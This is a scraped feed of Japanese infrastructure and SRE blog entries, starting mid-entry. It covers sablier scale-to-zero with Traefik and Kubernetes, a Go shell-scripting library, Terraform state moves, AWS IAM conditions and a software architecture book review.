に設定をしたので2分後には落ちるはずです。apiVersion: traefik.containo.us/v1alpha1kind: Middlewaremetadata:  name: code-server-sablier  namespace: defaultspec:  plugin:    sablier:      names: deployment_default_code-server-deployment_1      sablierUrl: \'http://sablier:10000\'      sessionDuration: 2m      dynamic:        displayName: \'Code Server Demo\'        showDetails: true        theme: hacker-terminal        refreshFrequency: 5s$ k apply -f app-sablier-middleware.yaml$ k get middlewareNAME                  AGEcode-server-sablier   2m5sその後にapp-ingress-patch.yaml を作成し、kubectl patch ingress code-server-ingress --patch-file app-ingress-patch.yaml でIngressにパッチを当てます。metadata:  annotations:    traefik.ingress.kubernetes.io/router.middlewares: default-code-server-sablier@kubernetescrdパッチを当てた直後はアクセスがないのでpod 数は0です。$ k get pod No resources found in default namespace.しかし、traefik 及びsablier の動作によってhttp://localhost:8080 に何もせずにアクセスできました。この時に関連している各種ログを確認すると動作していることがわかります。$ k get pod NAME                                      READY   STATUS    RESTARTS   AGEcode-server-deployment-7f56554786-j4b69   1/1     Running   0          2m44sそして、2分後にはシャットダウンされていると思います。# -w で継続的にウォッチする$ k get po -wNAME                                      READY   STATUS    RESTARTS   AGEcode-server-deployment-7f56554786-t5j8x   1/1     Running   0          36scode-server-deployment-7f56554786-t5j8x   1/1     Terminating   0          2m17scode-server-deployment-7f56554786-t5j8x   0/1     Terminating   0          2m18scode-server-deployment-7f56554786-t5j8x   0/1     Terminating   0          2m18scode-server-deployment-7f56554786-t5j8x   0/1     Terminating   0          2m18sさいごに本来やりたかった。Kubernetes 環境での動作確認までできました。此処から先は皆さんの環境に合うようにいくつかの設定ファイルを見ていく会を本来やれれば良かったですが眠いのでおやすみです。作業リポジトリgithub.com","link":"https://syu-m-5151.hatenablog.com/entry/2022/11/30/085418","isoDate":"2022-11-29T23:54:18.000Z","dateMiliSeconds":1669766058000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"【Codezine掲載】エンジニアの事業貢献、必要な第一歩とは？ 松本亮介氏\xd7スリーシェイクが解説！ エンジニアがプロダクトやビジネスへの理解を深める方法","contentSnippet":"「デベロッパーの成長と課題解決に貢献するメディア」をコンセプトに情報発信を行うソフトウェア開発者向けWebメディア「Codezine」に、弊社SREである手塚と、多数の企業で技術顧問などを務める松本亮介氏の対談記事が掲載されましたThe post 【Codezine掲載】エンジニアの事業貢献、必要な第一歩とは？ 松本亮介氏\xd7スリーシェイクが解説！ エンジニアがプロダクトやビジネスへの理解を深める方法 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/codezine_engineer_product/","isoDate":"2022-11-29T05:25:53.000Z","dateMiliSeconds":1669699553000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Google BigQuery: The Definitive Guideを読んでみた","contentSnippet":"はじめに 2021年スリーシェイクに入社してから案件で BigQuery を触ったのをきっかけに、Google BigQuery: The Definitive Guideを読んだので本の内容を一部紹介します。 10章ま […]The post Google BigQuery: The Definitive Guideを読んでみた first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/google-bigquery-the-definitive-guide/","isoDate":"2022-11-29T02:25:13.000Z","dateMiliSeconds":1669688713000,"authorName":"Sreake","authorId":"Sreake"},{"title":"オブザーバビリティについて理解する (収集・分析・可視化）","contentSnippet":"クラウド基盤の登場により、自社でサーバーを構築してシステムを運用するオンプレ以外の選択肢が増えてきました。多くの企業では、クラウド基盤を活用してシステム運用の効率化を図っているでしょう。 しかし、システムによってはまだま […]The post オブザーバビリティについて理解する (収集・分析・可視化） first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/observability/","isoDate":"2022-11-29T01:05:03.000Z","dateMiliSeconds":1669683903000,"authorName":"Sreake","authorId":"Sreake"},{"title":"私はGo言語でシェルスクリプトが書きたい不都合な生きもの","contentSnippet":"Goに入ってはGoに従え 私の好きな言葉です(スライド)。XX(架空の)という言語を書いてるならばXX言語らしく書きましょうと常々、思っております。しかし、インフラエンジニアの魂に最も刻まれた言語は何か？ それはシェルスクリプトではないですか。異論は認めます。はじめになんでみんなこんなに怒っているのかというような疑問はある。世の中がぎすぎすしていて、明るい話題がない。この世にはもっと明るい話が必要だと思うのだが、思いつきませんでした。まず、シェルスクリプトだとこう書くという明確な思考があるのにそれをGo言語で表現する方法が分からない場面で悔しい思いをしてきた方もいらっしゃるのではないかと思います。そういう方に明るい話題を提供したいです。script はシェルスクリプトが得意とする、ファイルの読み込み、サブプロセスの実行、行数のカウント、文字列のマッチングなどを行うための Go のライブラリです。Goでシステム管理プログラムを書くのは、典型的なシェルと同じように簡単ですか？ scriptはそれを簡単にすることを目的としています。大体の場合ではScripting with Go といくつかのブログを読めばよい。script/magic.png at master \xb7 bitfield/script \xb7 GitHub より引用github.comシェル芸という実益を兼ねた趣味シェル芸というおしゃれでハイソな趣味がある。シェル芸とは、マウスも使わず、ソースコードも残さず、GUIツールを立ち上げる間もなく、あらゆる調査・計算・テキスト処理をCLI端末へのコマンド入力一撃で終わらすこと。あるいはそのときのコマンド入力のこと(シェル芸の定義バージョン1.1 より引用) を指すのだかこれをやっていくのはインフラエンジニアが運用をやっていくなかで力になるものです。私も学生時代にシェル芸初心者によるシェル芸入門 というスライド をみてとてもお世話になった。こちらから演習1の問題を拝借してscript について紹介したいと思います。演習1 という演習先程、紹介したシェル芸初心者によるシェル芸入門というスライドには演習があります。演習1の内容は /home 以下(MACの場合には/Users)から現在ログインしているユーザーの名前を含むファイルを全て列挙してくださいというものです。それをシェルスクリプトで書くと以下のようになります。想定回答はこちらgrep -r `whoami` /Users | grep -v matches 2>/dev/null解く\uD83D\uDC18この課題をscript を用いて解決したい。と思ったのですがgrep に-r オプションがないことに気づいたのでfindfile を用いて実行する。package mainimport (    \\"fmt\\"    \\"strings\\"    \\"github.com/bitfield/script\\")func main() {    // whoami は用意されていないです。だが、用意されていないコマンドもexecで実行できる    user, _ := script.Exec(\\"whoami\\").String()    // exec で実行したら実行後の改行が入るので削除しておくオプションがあるなら知りたい    // filepath を作成する    user_file_path := \\"/Users/\\" + remove_line_breaks(user) + \\"/\\"    // 実際のコマンドを実行して標準出力に投げる    _, err := script.FindFiles(user_file_path).Stdout()    if err != nil {        fmt.Println(err)    }}// 末尾の改行を削除するfunc remove_line_breaks(s string) string {    s = strings.TrimRight(s, \\"\\\\n\\")    if strings.HasSuffix(s, \\"\\\\r\\") {        s = strings.TrimRight(s, \\"\\\\r\\")    }    return s}権限周りで辛いが権限をめちゃくちゃにイジるとMACの場合でもいける...。さいごに実際の技術検証だったらscript.Exec()が具体的にどのようにシェルで実行されたりするのかを調べるのですが別に趣味なのでここで終わりです。script を書いてて気付いたのですが別に各コマンドを実行するための近しいパッケージは存在するのでそれを調べて使えばぁッ...　ここで彼のメッセージは途切れる。","link":"https://syu-m-5151.hatenablog.com/entry/2022/11/26/174017","isoDate":"2022-11-26T08:40:17.000Z","dateMiliSeconds":1669452017000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"sablier でコンテナのScale to zero が実現できるので覗き見だけした。","contentSnippet":"はじめに人は強欲なのでコンテナを使っているのに必要な時必要な分だけのリソースを起動させてほしいという願いを常に持っている。Kubernetes の場合はKnativeなどを利用すれば達成できる。が今回はsablierというツールを紹介する。sablierはリバースプロキシを利用してアクセスがない時は自動的にシャットダウンしてアクセスがあれば指定のコンテナを起動することができるツールです。sablier/hourglass.png at main \xb7 acouvreur/sablier \xb7 GitHub よりやってみる公式サイトにはサンプルコードとして Cloud Native なアプリケーションプロキシーのTraefikを用いたものが紹介されている。ブログを書いている2022年11月25日の時点でplugins配下にTraefik しかないがnginxも追加しようというIssues が上がっている。Git CloneGit Clone をとりあえずしてRepositoryを持ってくる。こういう時にghqでローカルリポジトリを管理するかとても悩むのですが私は検証のみを行いたい時にはghqでは管理しないことが多いです。git clone https://github.com/acouvreur/sabliercd sablierdocker compose up最近、docker-compose がdocker に統合されたのでdocker-compose ではなくdocker compose を利用する。自分自身のこういうスタンス、嫌いではないです。docker compose up -d[+] Running 13/13 ⠿ whoami Pulled                                                                                     6.7s   ⠿ 29015087d73b Pull complete                                                                      0.9s   ⠿ 0109a00d13bc Pull complete                                                                      1.2s   ⠿ dfc0c371343c Pull complete                                                                      3.0s ⠿ traefik Pulled                                                                                    7.3s   ⠿ 47517142f6ba Pull complete                                                                      2.0s   ⠿ 24e179f025e9 Pull complete                                                                      2.3s   ⠿ 94b59dd82910 Pull complete                                                                      5.4s   ⠿ d3d7e56d0086 Pull complete                                                                      5.5s ⠿ sablier Pulled                                                                                   10.1s   ⠿ 9b18e9b68314 Pull complete                                                                      3.0s   ⠿ f8cfeb0e421f Pull complete                                                                      5.8s   ⠿ 3e48bafb90b9 Pull complete                                                                      5.8s[+] Running 3/3 ⠿ Container sablier-sablier-1  Started                                                              0.7s ⠿ Container sablier-whoami-1   Started                                                              0.8s ⠿ Container sablier-traefik-1  Started                                                              0.8ssablier-sablier-1,sablier-traefik-1,sablier-whoami-1 が動作していることが分かる。docker compose psNAME                COMMAND                  SERVICE             STATUS              PORTSsablier-sablier-1   \\"/etc/sablier/sablie…\\"   sablier             running             10000/tcpsablier-traefik-1   \\"/entrypoint.sh --ex…\\"   traefik             running             0.0.0.0:8080->80/tcpsablier-whoami-1    \\"/whoami\\"                whoami              running             80/tcp説明しておくとsablier-sablier-1 がシャットダウンさせたりしているアプリです。sablier-traefik-1 がリバースプロキシなのですがPluginの機構としてこちらがあることによってアプリケーションに変更を加えることなく機能の追加を行うことができる。典型的なサイドカーパターンですね。sablier-whoami-1 がアプリケーションの本体です。sablier/reverse-proxy-integration.png at main \xb7 acouvreur/sablier \xb7 GitHub よりまた、起動したdocker-compose の設定ファイルを読むと分かるが設定ファイルに関してdynamic-config.ymlが設定されておりアプリケーションの本体に対する設定はこちらで行われている。version: \\"3.7\\"services:  traefik:    image: traefik:2.9.1    command:      - --experimental.plugins.sablier.moduleName=github.com/acouvreur/sablier      - --experimental.plugins.sablier.version=v1.1.0      - --entryPoints.http.address=:80      - --providers.docker=true      - --providers.file.filename=/etc/traefik/dynamic-config.yml    ports:      - \\"8080:80\\"    volumes:      - \'/var/run/docker.sock:/var/run/docker.sock\'      - \'./dynamic-config.yml:/etc/traefik/dynamic-config.yml\'  sablier:    image: acouvreur/sablier:1.1.0    volumes:      - \'/var/run/docker.sock:/var/run/docker.sock\'    labels:      - traefik.enable=true      # Dynamic Middleware      - traefik.http.middlewares.dynamic.plugin.sablier.names=sablier-whoami-1      - traefik.http.middlewares.dynamic.plugin.sablier.sablierUrl=http://sablier:10000      - traefik.http.middlewares.dynamic.plugin.sablier.sessionDuration=1m      - traefik.http.middlewares.dynamic.plugin.sablier.dynamic.theme=hacker-terminal      # Blocking Middleware      - traefik.http.middlewares.blocking.plugin.sablier.names=sablier-whoami-1      - traefik.http.middlewares.blocking.plugin.sablier.sablierUrl=http://sablier:10000      - traefik.http.middlewares.blocking.plugin.sablier.sessionDuration=1m      - traefik.http.middlewares.blocking.plugin.sablier.blocking.timeout=30s  whoami:    image: containous/whoami:v1.5.0    # Cannot use labels because as soon as the container is stopped, the labels are not treated by Traefik    # The route doesn\'t exist anymore. Use dynamic-config.yml file instead.    # labels:    #  - traefik.enable    #  - traefik.http.routers.whoami.rule=PathPrefix(`/whoami`)    #  - traefik.http.routers.whoami.middlewares=dynamic@dockersablier/docker-compose.yml at main \xb7 acouvreur/sablier \xb7 GitHub より一旦、万全な状態でのアクセス確認を行うcurl http://localhost:8080/whoami/blockingHostname: 57f6719e2c3bIP: 127.0.0.1IP: 172.24.0.2RemoteAddr: 172.24.0.4:35092GET /whoami/blocking HTTP/1.1Host: localhost:8080User-Agent: curl/7.84.0Accept: */*Accept-Encoding: gzipX-Forwarded-For: 172.24.0.1X-Forwarded-Host: localhost:8080X-Forwarded-Port: 8080X-Forwarded-Proto: httpX-Forwarded-Server: d53703352004X-Real-Ip: 172.24.0.1アクセスの確認ができた。docker compose stopアプリケーション本体のコンテナを止める。docker compose stop whoami[+] Running 1/1 ⠿ Container sablier-whoami-1  Stoppedアプリケーション本体が止まっていることを確認できました。docker compose psNAME                COMMAND                  SERVICE             STATUS              PORTSsablier-sablier-1   \\"/etc/sablier/sablie…\\"   sablier             running             10000/tcpsablier-traefik-1   \\"/entrypoint.sh --ex…\\"   traefik             running             0.0.0.0:8080->80/tcpsablier-whoami-1    \\"/whoami\\"                whoami              exited (2)curl http://localhost:8080/whoami/blocking先程、と同様にエンドポイントを確認するとアクセスすることが確認できた。秒数としてどれくらい差分があるのか確認したかったが眠い。curl http://localhost:8080/whoami/blockingHostname: 57f6719e2c3bIP: 127.0.0.1IP: 172.24.0.2RemoteAddr: 172.24.0.4:35104GET /whoami/blocking HTTP/1.1Host: localhost:8080User-Agent: curl/7.84.0Accept: */*Accept-Encoding: gzipX-Forwarded-For: 172.24.0.1X-Forwarded-Host: localhost:8080X-Forwarded-Port: 8080X-Forwarded-Proto: httpX-Forwarded-Server: d53703352004X-Real-Ip: 172.24.0.1docker compose logs でログを確認するとStarting up on port 80とシャットダウンと起動を何度か繰り返していることが確認できた。また、自主的にstop せずとも落ちていることは確認できた。Linux 側からもプロセスを確認しようと思っていたが深夜なのでもう眠い。docker compose logs sablier-whoami-1   | Starting up on port 80sablier-whoami-1   | Starting up on port 80さいごにあまり使わない機能が多い検証環境や開発環境で利用するにはとても良いサービスだと思った。深夜かつ飲酒によって、本来はKubernetes 環境での動作確認までしたかったのですが眠いので終わりますが一応、公開します。","link":"https://syu-m-5151.hatenablog.com/entry/2022/11/25/185409","isoDate":"2022-11-25T09:54:09.000Z","dateMiliSeconds":1669370049000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"複数の Terraform リソースを一度に別の tfstate ファイルに移動する","contentSnippet":"Terraform の tfstate ファイル間のリソースの移動方法は，基本的には以下の記事の通りです。https://www.karakaram.com/moving-terraform-resources-to-another-tfstate-file/この記事では複数リソースを移動したい場合の方法を書きます。 方法やることはシンプルで，リソースをファイルで列挙して xargs で terraform state mv を繰り返すだけです。移動元ディレクトリで terraform state list を実行することで，その tfstate ファイル内の全リソースを取...","link":"https://zenn.dev/toshikish/articles/61db8661cb28ba","isoDate":"2022-11-25T07:33:50.000Z","dateMiliSeconds":1669361630000,"authorName":"toshikish","authorId":"toshikish"},{"title":"これでライブコーディングも怖くない！ cLive でターミナル操作を自動化する","contentSnippet":"cLive とは？cLive はシンプルな設定ファイルに基づいてターミナルを自動で操作するためのコマンドラインツールです。自動操作するターミナルはブラウザで表示されます。そのため、「任意のターミナルアプリで cLive を起動して、ブラウザだけ画面共有して自動ライブコーディングをする」といった使い方ができます。JavaScript のライブコーディングデモもちろん日本語入力も可能ですし、任意のタイミングで一時停止しておけば必要に応じて手動による操作もできます。手動操作のデモ リポジトリhttps://github.com/koki-develop/clive#r...","link":"https://zenn.dev/kou_pg_0131/articles/clive-introduction","isoDate":"2022-11-17T09:29:33.000Z","dateMiliSeconds":1668677373000,"authorName":"Koki Sato","authorId":"kokisato"},{"title":"[3-shake 秋季インターンブログ] eBPF によるコンテナセキュリティツールの Tetragon を検証してみた","contentSnippet":"Sreake事業部で2022年10月11日 ~ 24日に開催された短期インターンに参加しました。eBPF によるコンテナランタイムセキュリティツールの Tetragon の技術検証と運用方法の提案を行いました。以下では、その成果をまとめたいと思います。The post [3-shake 秋季インターンブログ] eBPF によるコンテナセキュリティツールの Tetragon を検証してみた first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/ebpf-tetragon/","isoDate":"2022-11-14T00:00:00.000Z","dateMiliSeconds":1668384000000,"authorName":"Sreake","authorId":"Sreake"},{"title":"RPM の install, uninstall 時に実行される script の確認","contentSnippet":"ある RPM Package のインストール、アンインストール時にどんな処理が行われているのか確認したいことがある そんな時な rpm コマンドの --scripts オプションを使用する rpm -qp --scripts ./some.rpm","link":"https://blog.1q77.com/2022/11/rpm-scripts/","isoDate":"2022-11-10T23:38:02.000Z","dateMiliSeconds":1668123482000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"AWS IAM ポリシーの StringNotEquals 条件の複数値指定は AND になる","contentSnippet":"AWS IAM ポリシーの条件で同一キーに対して複数値を指定した場合，通常は OR で評価されます。例えば，以下の StringEquals 条件の例では，aws:PrincipalTag/role が audit または security のいずれかであれば true になります。\\"Condition\\": {  \\"StringEquals\\": {    \\"aws:PrincipalTag/role\\": [ \\"audit\\", \\"security\\" ]  }}では StringNotEquals 条件にするとどうでしょうか？例えば以下のポリシーで aws:Principal...","link":"https://zenn.dev/toshikish/articles/2d9274783acbae","isoDate":"2022-11-10T08:31:56.000Z","dateMiliSeconds":1668069116000,"authorName":"toshikish","authorId":"toshikish"},{"title":"[3-shake 秋季インターンブログ] Config Connectorの検証","contentSnippet":"SRE技術の調査と研究を行う目的で2022年10月11日 ~ 24日に開催された短期インターンに参加しました。2週間という期間を使って、Google CloudのConfig Connectorについて調査を行ったので、本記事ではその調査結果をまとめます。The post [3-shake 秋季インターンブログ] Config Connectorの検証 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/config-connectortest/","isoDate":"2022-11-09T03:02:42.000Z","dateMiliSeconds":1667962962000,"authorName":"Sreake","authorId":"Sreake"},{"title":"2022年10月のふりかえり、まとめ","contentSnippet":"7年ぶりにふり返りするような気がします。これぶりですかね。blog.masasuzu.net10月は思い立って細かいことでも記録に残すようにし始めたのでサブブログの月間投稿数が増えてます。このまま続けたいところです。メインブログは相変わらず0なのでちゃんと書きたいところではあります。2022-10-01から1ヶ月間の記事一覧 - ふり返る暇なんて無いね仕事10月は端境期だったので、技術検証をメインでやってました。技術メインブログの方はどちらかというとパブリック向けに書いてます。ただ、この方針だと記事がゆるい記事が書きにくくなってきたので、サブブログを作った経緯があります。サブブログの技術記事は他の誰かのためではなく未来の自分が思い出すために書くをモットーに書いてます。なのでゆるく、細かい系のことも気軽に書いてます。分からないことは分からないと明示する。途中でも経過を残す。恥も残す。そんな感じです。以前とくらべてGoogle Cloud回りを10月はいじってた感じですね。build-in commandのmanが引けなくて困った - ふり返る暇なんて無いねt3系インスタンスのスペックについて - ふり返る暇なんて無いねGoogle Cloudの外部HTTP(S)ロードバランサと外部HTTP(S)ロードバランサ(従来型)の違いがわからなかった。 - ふり返る暇なんて無いね未解決: Google Cloud Storageの静的配信でnginxで言うところのtry_files的なことをしたかった。。。。 - ふり返る暇なんて無いねはてなブログのカテゴリごとのRSSフィード - ふり返る暇なんて無いねGitHub Actionsで save-state とset-output が廃止されるようです。 - ふり返る暇なんて無いね故障と障害の違いがわからずに困惑してた - ふり返る暇なんて無いね資格PCA取りました!11月にはPCA、KCNA、年内にCKA、CKADを取ることを目標に業務とは別に学習してます。なお、業務ではGoogle CloudもKubernetesも今のところ触る余地ないです。が、将来の投資として学習してます。近い未来で使うのが目に見えてるので。Google Cloud認定 Professional Cloud Architect合格してた - ふり返る暇なんて無いね11月末ターゲットで2個資格試験受けます - ふり返る暇なんて無いね旅土曜日の午前中に温泉入るのにはまってます。休日の早い時間に行動すると時間の有効活用ができるなとしみじみ感じてます。人生に疲れたので熱海で温泉入ってきた - ふり返る暇なんて無いね横須賀で温泉入ってきた - ふり返る暇なんて無いね江ノ島に行ってきて午前中だけで満足した - ふり返る暇なんて無いね生活寒くなりましたが、がんばります。今季初暖房使いました。 - ふり返る暇なんて無いね技術書を複数回読むということ - ふり返る暇なんて無いねワクチン4回目打った\uD83D\uDC89\uD83D\uDC89\uD83D\uDC89\uD83D\uDC89 - ふり返る暇なんて無いね11月に向けてといっても11月始まってますが。11月は資格の勉強もあるし、新しい固めのお仕事も始まるので、だいぶヘビーになる予感を感じてます。寒くなる季節なので体調には気を付けつつも、引き続き温泉につかり、ブログ書くのも続けて行きたいですね。","link":"https://blog.masasuzu.net/entry/2022/11/09/082007","isoDate":"2022-11-08T23:20:07.000Z","dateMiliSeconds":1667949607000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Cognito ユーザープールに削除保護を設定できるようになったので試してみた","contentSnippet":"Cognito ユーザープールに削除保護を設定できるようになりました。https://aws.amazon.com/jp/about-aws/whats-new/2022/10/amazon-cognito-console-user-pool-deletion-protection/削除保護の設定方法と、削除保護が有効なときに削除しようとしたときの挙動を調べてみました。 削除保護を有効にする手順 Terraform から設定する場合!AWS Provider のバージョンが 4.38.0 以上である必要があります。aws_cognito_user_pool Resou...","link":"https://zenn.dev/kou_pg_0131/articles/aws-cognito-user-pool-deletion-protection","isoDate":"2022-11-07T10:49:54.000Z","dateMiliSeconds":1667818194000,"authorName":"Koki Sato","authorId":"kokisato"},{"title":"[3-shake 秋季インターンブログ] Trivy Operator を用いた脆弱性管理の提案","contentSnippet":"Sreake 事業部は SRE関連技術に強みを持つエンジニアによるコンサルテーションサービスを提供する事業部であり、私たちも SRE 技術の調査と研究を行う目的で2022年10月11日 ~ 24日に開催された短期インターンに参加しました。2週間という期間を使って、Trivy Operator の技術検証と運用方法の提案を行いました。本記事では、その成果をまとめたいと思います。The post [3-shake 秋季インターンブログ] Trivy Operator を用いた脆弱性管理の提案 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/trivy_operator_vulnerability/","isoDate":"2022-11-07T07:04:20.000Z","dateMiliSeconds":1667804660000,"authorName":"Sreake","authorId":"Sreake"},{"title":"GoでHTTPミドルウェアをチェインするライブラリを書いた","contentSnippet":"GoでHTTPサーバを書くとき、ミドルウェアを利用することがある。関数を入れ子にすることで数珠つなぎにできるが記述が長くなってしまう。go-chiなどのHTTPフレームワークにはミドルウェアをチェインするメソッドが生えていることがある。しかし、このメソッドはフレームワークに強く依存していて使い回しにくいのでライブラリとして切り出した。https://github.com/Pranc1ngPegasus/middlechain どうやって使うのこのライブラリは以下のようにして使うことができる。mux := http.NewServeMux()handler := mid...","link":"https://zenn.dev/pranc1ngpegasus/articles/30638ae4d15ae6","isoDate":"2022-11-06T00:07:27.000Z","dateMiliSeconds":1667693247000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"/etc/hosts で wildcard や CNAME 対応させたい","contentSnippet":"macOS での話です。(macOS Ventura でも機能することを確認しました) /etc/hosts で 203.0.113.2 *.example.com みたいに wildcard に対応させたいことが稀にあります。 また、AWS の Application Load Balancer のように IP アドレスの固定され","link":"https://blog.1q77.com/2022/10/mac-etc-resolver/","isoDate":"2022-10-30T14:56:34.000Z","dateMiliSeconds":1667141794000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Kubernetes クラスタ内ホスト名に CNAME レコードでエイリアスを付与したい","contentSnippet":"Kubernetes クラスタ内で使えるホスト名に CNAME レコード相当でエイリアスを付与したい場合を考えます。クラスタ内では CoreDNS が使われているものとします。 TL;DRCorefile（CoreDNS の設定ファイル）で rewrite プラグインを使って記述します。例えば Service のアドレスである foo.default.svc.cluster.local を foo.example.com にエイリアスしたい場合は以下のように行を追加します。apiVersion: v1kind: ConfigMapmetadata:  name: cor...","link":"https://zenn.dev/toshikish/articles/7f555dbf1b4b7d","isoDate":"2022-10-28T10:45:26.000Z","dateMiliSeconds":1666953926000,"authorName":"toshikish","authorId":"toshikish"},{"title":"SREとして「ソフトウェアアーキテクチャの基礎」を読んでないのに堂々と語る方法","contentSnippet":"このエントリーで言いたいことシステムの構造や各種機能を実装することもアドバイスを求められることも非常に少ないがSREもソフトウェアアーキテクチャに関わることがある。それは、プログラマーとしてではなくアーキテクチャ特性の専門家としてアーキテクチャに触れる場面です。そのため、アーキテクチャ全体についての知識は得ておくことは良いこと。タイトル説明読んでいない本について堂々と語る方法という書籍がある。読んでいないにも色々あって…本当にぜんぜん読んだことのない本、ざっと読んだもしくは流し読みをしたことがある本。人から聞いたことがある本、ブログで書評だけ読んだ本、読んだことはあるが忘れてしまった本などあらゆる本を語る技術に書かれている読書論の本のタイトルだけのオマージュです。はじめに本日、10/27に『ソフトウェアアーキテクチャの基礎』を執筆した著者陣が書いた『ソフトウェアアーキテクチャ・ハードパーツ - 分散アーキテクチャのためのトレードオフ分析』が発売されました。絶対的な銀の弾丸がないソフトウェアアーキテクチャの世界ではトレードオフを見極め、状況に合った選択をすることが常に求められます。悔いなき判断には多くの知恵と経験が要求されると思います。ハードパーツは、読者が自身のアーキテクチャ上の難題に対して効果的なトレードオフ分析を行い、より良い決定ができるようにするための書籍です。また、我々SREはプロジェクトやシステムに対して意見や判断を求められることも多くあると思います。そんな時にきっと、ソフトウェアアーキテクチャの基礎やソフトウェアアーキテクチャ・ハードパーツ を読んでおけばよかったと思うことがあるかもしれません。このエントリーではその前作のソフトウェアアーキテクチャの基礎の概要を確認することでハードパーツへの理解をより深めていけるとおもいます。優秀なアーキテクチャになりたいから読んでほしいわけではありません。スペシャリストとして意見や判断を求められた時の判断材料や語彙の強化などで今後のエンジニア人生に役に立ってくれると思います。このエントリーは『ソフトウェアアーキテクチャの基礎』を読んでみた中での感想文となります。「ソフトウェアアーキテクチャの基礎」の目次部と章立ては以下の通りです。全24章もありこれだけでもすごく勉強になります。個人的には付録Aの自己評価のためのチェックリストをやってみてから本書を読むのも良いかな‐って思っているが自分はやっていないので何も責任は持てない。Ⅰ部では基礎や概念、Ⅱ部では詳細な各アーキテクチャについて、Ⅲ部ではソフトスキルとマネジメントテクニックみたいな話をしてます。1章 イントロダクション# 第I部 基礎2章 アーキテクチャ思考3章 モジュール性4章 アーキテクチャ特性5章 アーキテクチャ特性を明らかにする6章 アーキテクチャ特性の計測と統制7章 アーキテクチャ特性のスコープ8章 コンポーネントベース思考# 第II部 アーキテクチャスタイル9章　基礎10章　レイヤードアーキテクチャ11章 パイプラインアーキテクチャ12章 マイクロカーネルアーキテクチャ13章 サービスベースアーキテクチャ14章 イベント駆動アーキテクチャ15章 スペースベースアーキテクチャ16章 オーケストレーション駆動サービス指向アーキテクチャ17章 マイクロサービスアーキテクチャ18章　適切なアーキテクチャスタイルを選ぶ# 第III部　テクニックとソフトスキル19章 アーキテクチャ決定20章 アーキテクチャ上のリスクを分析する21章 アーキテクチャの図解やプレゼンテーション22章 効果的なチームにする23章 交渉とリーダーシップのスキル24章 キャリアパスを開く付録A　自己評価のためのチェックリスト参考文献訳者あとがき索引目次や本の詳細についてはO’Reilly Japanよりご確認ください。特徴と感想問われるシステムアーキテクチャとしての知見の広さと深さ目次を見ると分かると思います。が、単純にいくつかのアーキテクチャについての紹介しているだけではありません。アーキテクチャを考える際に必要な思考方法やどのような部分に思考を巡らせればよいか、リスク分析から立ち回りまで広大なトピックを凝縮し網羅的にまた、今という視点だけではなくどのような技術的な変化や背景があっては今に至るのか？ などの文脈まで考慮されて書かれています。この、書籍の好きなところは2点あります。1つ目は定義づけて不毛な議論を避けることです。Twitterで定期的に発生する背景なき不毛な議論もほとんど無くなるといいなと思ってます。2つ目は技術的な手法だけではなくところです。結局は人の問題で、全ての議論でチームや人を蔑ろにせずソフトスキルや技芸へのリスペクトがあるところです。また、『ソフトウェアアーキテクチャの基礎』を一冊読んだところで直ちに目の前にあるソフトウェアやアプリが急激によくなったりすることはない。が今後のソフトウェアの開発に関わって生きていく上でまた、様々な指標になる素晴らしい書籍だと思いました。本当は一章づつ振り返りたいのですが時間的にも余裕がないので少しだけ紹介させてほしいです。ソフトウェアアーキテクチャとは？ソフトウェアアーキテクチャと言われた時に、要件とその他すべてのアーキテクチャ特性から構成されるものをふわっとまとめてなんとなくそう考えていたり言及してました。本書では以下のように4つに分類され定義されます。あと、このあとに出てくる図がとても整理があると自分が何について考えなければならないのか明確になるので本書を読んで最初に勝ちを確信しました。私は洋書が出てからすぐに友人からすごい書籍があるから紹介されて読んだので読んだことはあるが忘れてしまった本に近いのだがこの時の感動は今でも覚えている。私たちのソフトウェアアーキテクチャについての考え方を示す。私たちは、ソフトウェアアーキテクチャを、システムの構造、システムがサポートしなければならないアーキテクチャ特性（「イリティ（-ility））、アーキテクチャ決定、そして設計指針の組み合わせで構成されるものだと考えている。システムの構造マイクロサービスやレイヤード、マイクロカーネルなどのシステムを実装するアーキテクチャスタイルの種類を指す。よくアーキテクチャの全てだと勘違いされがちです。アーキテクチャ特性(-ility)アーキテクチャ特性はシステムの成功基準を定めるものです。通りの良い単語でいうと非機能要件などが近い。通常、システムの機能とは直接関係しない。システムの機能に関する知識を必要としない。しかし、システムが適切に機能するには、これらの特性への理解が必要となる。SREとしてはこの分野に対して専門性を求められる機会が多い。アーキテクチャ決定アーキテクチャ決定は、システムをどのように構築すべきかのルールを定めるものだ。アーキテクチャ決定は、システムの制約を形作り、何が許されて何が許されないかに関する開発チームの指針となるように行う。設計指針設計指針は、堅苦しいルールではなくあくまでガイドラインです。サービス間通信のすべての条件、選択肢を完璧に網羅するアーキテクチャ決定を定めるのは不可能です。非現実的なコストをかければ別だが。その代わりに、設計指針として、望ましいアプローチに関するガイドを提供する。ソフトウェアアーキテクトへの8つの期待ソフトウェアアーキテクトがどのような役割が求められるかは組織やチームによって違いがあるような気がする。本書ではソフトウェアアーキテクトに対する8つの期待がある。そのうち3つがソフトスキルなのも優秀なソフトウェアアーキテクトが人間と向き合わなければならないのを示している。SREの探求の5章 サードパーティとの協力を円滑に進める重要性でも事業に対する理解と政治の重要性について何度も言及されている。アーキテクチャ決定を下すアーキテクチャを継続的に分析する最新のトレンドを把握し続ける決定の順守を徹底する多様なものに触れ、経験している事業ドメインの知識を持っている対人スキルを持っている政治を理解し、かじ取りするソフトウェアアーキテクチャの法則ソフトウェアアーキテクチャはトレードオフがすべてだ。 